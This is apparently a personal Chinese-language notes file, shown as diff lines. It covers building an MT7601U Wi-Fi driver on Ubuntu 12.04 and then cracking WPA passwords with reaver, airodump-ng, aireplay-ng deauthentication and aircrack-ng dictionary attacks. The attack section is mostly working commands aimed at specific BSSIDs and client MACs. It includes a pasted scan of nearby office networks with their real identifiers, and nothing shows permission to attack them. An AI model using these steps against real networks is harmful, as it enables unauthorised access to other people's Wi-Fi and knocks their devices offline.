@@ -1,0 +1,175 @@
+ubuntu12.04 X86 环境下安装MT7601U驱动过程：
+
+（0）下载和编译安装sta的驱动（不是AP驱动）
+git clone https://github.com/porjo/mt7601.git
+cd mt7601/src
+make
+mkdir -p /etc/Wireless/RT2870STA/
+cp RT2870STA.dat /etc/Wireless/RT2870STA/
+insmod os/linux/mt7601Usta.ko
+这个步骤成功之后忽略（1）和（2）步骤，进入（3）步骤。
+lsmod mt7601Usta 
+
+（1）下载对应的驱动代码：
+然后修改其中内容：
+使用lsusb检查当前USB网卡的ID值，然后在/common/rtusb_dev_id.c文件中的#ifdef MT7601U内部添加代码：
+{USB_DEVICE(0x148f,0x760b)}, /* 360 Wifi */
+保存后退出；
+然后修改/os/linux/rt_linux.c文件中的类型转换问题：
+$ vim ./os/linux/rt_linux.c
+第1121、1122行，可用 " /current_fsuid() " 尋找
+pOSFSInfo->fsuid = current_fsuid();
+pOSFSInfo->fsgid = current_fsgid();
+改成
+pOSFSInfo->fsuid = (int )&current_fsuid();
+pOSFSInfo->fsgid = (int )&current_fsgid();
+保存之后退出。
+
+（2）编译和安装驱动：
+sudo make clean
+sudo make
+sudo make install
+然后开始加载驱动到内核：
+sudo modprobe mt7601Uap
+更新驱动依赖：
+sudo depmod
+
+（3）加载驱动：
+重启服务：
+sudo service networking restart
+查看网卡：
+ifconfig -a
+然后启动网卡：
+sudo ifconfig ra0 up
+
+（4）安装aircrack-ng:
+首先安装基本支持：
+sudo apt-get install build-essential iw ethtool
+(sudo apt-get libssl-dev libnl-dev )
+在安装openssl的时候出现问题，已经默认安装的版本太高，需要降级处理：
+sudo apt-get install libssl-dev
+报错：
+{
+ibssl-dev : Depends: libssl1.0.0 (= 1.0.1-4ubuntu5) but 1.0.1-4ubuntu5.3 is to be installed
+              Recommends: libssl-doc but it is not going to be installed
+}
+使用aptitude进行安装openssl
+sudo apt-get install aptitude
+sudo aptitude install libssl-dev
+选择n-y-y
+
+然后解压缩aricrack-ng的代码，并进入解压目录：
+make
+sudo make install
+执行下载安装：
+sudo airodump-ng-oui-update
+执行安装完毕的测试：
+sudo airmon-ng
+
+使用Reaver破解无线网络的WPA密码，首先安装reaver的支持库：
+sudo apt-get install libpcap-dev libpcap0.8-dev
+降级sqlite
+sudo aptitude install libsqlite3-dev
+选项：n-y-y
+然后开始配置编译：
+./configure
+make
+sudo make install
+
+（5）使用aircrack-ng：
+添加mac80211驱动：
+sudo modprobe  mac80211
+否则报错找不到。
+开启无线网卡监控模式，执行命令：
+sudo airmon-ng start ra0
+搜索附近WIFI信号，执行命令：
+sudo airodump-ng ra0
+办公室返回结果如下：
+{
+ B0:48:7A:20:48:EE    0        8        0    0  13  54e. WPA2 CCMP   PSK  han
+ 80:89:17:2C:EF:BA    0       21       19    0  13  54e. WPA2 CCMP   PSK  GZUSYS
+ 84:18:3A:D7:A9:F9    0       24        0    0  13  54e. WPA2 CCMP   PSK  pda
+ 84:18:3A:57:A9:FA    0       26        0    0  13  54e. WPA2 CCMP   PSK  c
+ 84:18:3A:17:A9:FA    0       26        0    0  13  54e. WPA2 CCMP   PSK  dudao
+ 84:18:3A:97:A9:F9    0       25        0    0  13  54e. WPA2 CCMP   PSK  c_ll
+ 84:18:3A:17:A9:F9    0       29       56    0  13  54e. WPA2 CCMP   PSK  CANUDILO SMS
+ 84:18:3A:D7:A9:F8    0       27        0    0  13  54e. WPA2 CCMP   PSK  YSL
+ 84:18:3A:97:A9:F8    0       28        0    0  13  54e. WPA2 CCMP   PSK  ysl_13_lin
+ 84:18:3A:57:A9:F8    0       28      119    0  13  54e. WPA2 CCMP   PSK  CANUDILO GUEST
+ 84:18:3A:17:A9:F8    0       29      204    0  13  54e. WPA2 CCMP   PSK  CANUDILO
+ 84:18:3A:57:A9:F9    0       29        0    0  13  54e. WPA2 CCMP   PSK  ysl_fglin
+ E4:2F:26:30:0A:E8    0       36        0    0   8  54e  WPA  CCMP   PSK  CU_aXXZ
+ A4:29:40:04:B4:00    0       64        0    0   9  54e  WPA2 CCMP   PSK  ChinaNet-161j
+ C8:3A:35:1A:6A:48    0       65        0    0   9  54e  WPA  CCMP   PSK  Ee_Ye
+ C8:E7:D8:48:D8:66    0       56        0    0   6  54e. WPA2 CCMP   PSK  1406
+ 50:BD:5F:1C:2E:54    0       43       67    0   6  54e. WPA2 CCMP   PSK  zzwh1
+ 00:22:AA:D9:03:A0    0        8        0    0  11  54e. WPA2 CCMP   PSK  dannyandping
+ D8:15:0D:09:36:86    0       58       20    0  11  54e. WPA2 CCMP   PSK  TP-LINK_3686
+ CE:3D:82:02:9E:FF    0        5        0    0  11  54e. WPA2 CCMP   PSK  360�..费WiFi-BY
+ 90:72:40:1D:3E:32    0       21        0    0  11  54e  WPA2 CCMP   PSK  15th AirPort
+ 50:BD:5F:03:4F:FE    0       27        0    0  11  54e. WPA2 CCMP   PSK  88888888
+ 50:BD:5F:46:5A:72    0       54        0    0  11  54e. WPA2 CCMP   PSK  1306
+ A4:29:40:15:6F:03    0       24        0    0  11  54e  WPA2 CCMP   PSK  ChinaNet-5WZN
+ 94:77:2B:07:AE:C8    0       53        1    0  10  54e  WPA2 CCMP   PSK  Sharon 2.4G
+ D8:5D:E2:39:60:53    0       46        0    0  10  54e. WPA2 CCMP   PSK  phantom
+}
+
+
+（6）破解wifi：
+选中上述airodump-ng ra0中返回的BSSID中的一个，然后使用：
+sudo reaver -i ra0 -b 4C:8B:EF:24:DE:E0 -a -S -vv -d 0
+已知测试AP：00000000
+sudo reaver -i ra0 -b 84:18:3A:57:A9:F8 -a -S -vv -d 0
+注意：一定要权限，否则报错！
+等待破解成功。一般需要4-10小时的时间。
+
+（7）使用aircrack-ng破解：
+上述使用方法破解测试不成功，所以更换为aircrack-ng自带的破解方法：
+airodump-ng --channel 6 –w longas --bssid 4C:8B:EF:24:DE:E0 ra0
+加速：
+aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
+所以就是：
+aireplay-ng -0 1 –a 4C:8B:EF:24:DE:E0 -c B0:9F:BA:95:A5:A6 ra0
+直到airdump界面中出现了“WPA handshake”的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文，就可以开始跑字典了：
+aircrack-ng -w dic 捕获的cap文件
+也就是：
+aircrack-ng -w /home/wen/wifi/dict/all.lst /home/wen/wifi/.cap
+可以看见破解的首先一点就是获取连接是handshake，然后用很强的字典开始破。
+
+（8）重启之后的启动过程：
+首先加载usb网卡的驱动（不知道为什么不能自动加载）
+sudo insmod /home/wen/dev/mt7601-master/src/os/linux/mt7601Usta.ko
+加载mac80211驱动
+sudo modprobe mac80211
+检查当前网卡状况：
+ifconfig -a
+打开ra0网卡
+sudo ifconfig ra0 up
+打开网卡扫描：
+sudo airmon-ng start ra0
+开始监听：
+sudo airodump-ng ra0
+新建一个终端，选中一个BSSID，然后开始等待连接：
+sudo airodump-ng --channel 6 –w longas  ra0 --bssid 4C:8B:EF:24:DE:E0
+加速破解：
+aireplay-ng -0 1 –a 4C:8B:EF:24:DE:E0 -c A0:18:28:1B:74:F1 ra0
+通过字典分析结果：
+aircrack-ng -w /home/wen/wifi/all.lst /home/wen/wifi/.cap
+
+
+测试：
+6A:89:E4:6F:4C:05
+sudo airodump-ng --channel 1 –-write /home/wen/wifi/result/test --bssid 6A:89:E4:6F:4C:05 ra0
+station:
+00:08:22:02:C1:FB
+aireplay-ng -0 1 –a 6A:89:E4:6F:4C:05 -c 00:08:22:02:C1:FB ra0
+
+
+
+ 
+
+
+参考：
+http://blog.csdn.net/andy812110/article/details/24842219
+
+
